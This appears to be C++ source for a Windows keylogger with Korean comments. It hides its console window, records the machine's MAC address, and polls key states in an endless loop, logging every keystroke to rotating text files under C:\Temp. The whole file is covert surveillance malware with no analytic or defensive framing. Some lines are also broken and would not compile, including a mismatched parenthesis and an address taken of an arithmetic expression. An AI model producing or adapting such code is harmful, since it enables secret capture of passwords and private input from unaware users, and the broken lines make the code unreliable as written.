//#include "stdafx.h"
#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <windows.h>
#include <winuser.h>   
#include <string.h>
#include <stdlib.h>
#include<WinSock.h>
#include<IPHlpApi.h>
#pragma comment(lib, "iphlpapi.lib" )

using namespace std;
int Save(int key_stroke, char *file);
void Stealth();

void file_name(char *old, int cnt)//file이름 설정
{
   int i;
   char *txt = ".txt";
   char file_num[2] = "a";
   char *p;
   p = &file_num[0];
   for (i = 0; i < cnt; i++)
   {
      (*p)++;
   }
   strcat(old, file_num);
   strcat(old, txt);
}
void user_Address()//mac_address 불러오는 함수
{
   char strMac[256];
   char username[500] = "C:\\Temp\\UserMac.txt";
   FILE *OUTPUT_FILE;
   OUTPUT_FILE = fopen(username,"a+");

   DWORD size = sizeof(PIP_ADAPTER_INFO);
   PIP_ADAPTER_INFO Info;
   ZeroMemory(&Info,size);
    int result = GetAdaptersInfo(Info,&size );//첫번째 랜카드 Mac adrress 가져오기
   if(result == ERROR_BUFFER_OVERFLOW)//getadaptersinfo가 메모리 부족하면 재할당하고 재호출
   {
      Info = (PIP_ADAPTER_INFO)malloc(size);
      GetAdaptersInfo(Info,&size);
   }

   sprintf(strMac, "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", 
      Info->Address[0], Info->Address[1], Info->Address[2], Info->Address[3], Info->Address[4], Info->Address[5] );
   
      fprintf(OUTPUT_FILE,"%s",strMac);
      fclose(OUTPUT_FILE);
}

int main()
{

   char i;
   int cnt = 0, j = 0;
   char oldstr[500] = "C:\\Temp\\a";
   

   Stealth();
   user_Address();
   while (1)
   {
      for (i = 8; i <= 190; i++)
      {
         if (GetAsyncKeyState(i) == -32767) {
            if (cnt > 25) {
               cnt = 0;
            }
            file_name(oldstr, cnt);
            Save(i, oldstr);

            if (j >= 30) {
               cnt++;
               j = 0;
            }
            else
               j++;
            strcpy(oldstr, "C:\\Temp\\a");
         }
      }

   }
   system("PAUSE");
   return 0;
}
int Save(int key_stroke, char *file)//타이핑한 문자를 텍스트에 저장
{
   if ((key_stroke == 1) || (key_stroke == 2))
      return 0;

   FILE *OUTPUT_FILE;
   OUTPUT_FILE = fopen(file, "a+");

   cout << key_stroke << endl;

   if (key_stroke == 8)
      fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
   else if (key_stroke == 13)
      fprintf(OUTPUT_FILE, "%s", "[Enter]");
   else if (key_stroke == 32)
      fprintf(OUTPUT_FILE, "%s", " ");
   else if (key_stroke == VK_TAB)
      fprintf(OUTPUT_FILE, "%s", "[TAB]");
   else if (key_stroke == VK_SHIFT)
      fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
   else if (key_stroke == VK_CONTROL)
      fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
   else if (key_stroke == VK_ESCAPE)
      fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
   else if (key_stroke == VK_END)
      fprintf(OUTPUT_FILE, "%s", "[END]");
   else if (key_stroke == VK_HOME)
      fprintf(OUTPUT_FILE, "%s", "[HOME]");
   else if (key_stroke == VK_LEFT)
      fprintf(OUTPUT_FILE, "%s", "[LEFT]");
   else if (key_stroke == VK_UP)
      fprintf(OUTPUT_FILE, "%s", "[UP]");
   else if (key_stroke == VK_RIGHT)
      fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
   else if (key_stroke == VK_DOWN)
      fprintf(OUTPUT_FILE, "%s", "[DOWN]");
   else if (key_stroke == 190 || key_stroke == 110)
      fprintf(OUTPUT_FILE, "%s", ".");
   else if (key_stroke == 186)
	   fprintf(OUTPUT_FILE, "%s","@");
   else if(key_stroke >= 96 && key_stroke <= 105)
	   fprintf(OUTPUT_FILE, "%s",&(key_stroke-48);
   else if(key_stroke == 106)
	   fprintf(OUTPUT_FILE, "%s","*");
   else if(key_stroke == 107)
	   fprintf(OUTPUT_FILE, "%s","+");
   else if(key_stroke == 109)
	   fprintf(OUTPUT_FILE, "%s","-");
   else if(key_stroke == 110)
	   fprintf(OUTPUT_FILE, "%s",".");
   else if(key_stroke == 111)
	   fprintf(OUTPUT_FILE, "%s","/");
   else 
      fprintf(OUTPUT_FILE, "%s", &key_stroke);
   fclose(OUTPUT_FILE);
   return 0;
}
void Stealth()//콘솔창 숨기기
{
   HWND Stealth;
   AllocConsole();
   Stealth = FindWindowA("ConsoleWindowClass", NULL);
   ShowWindow(Stealth, 0);
}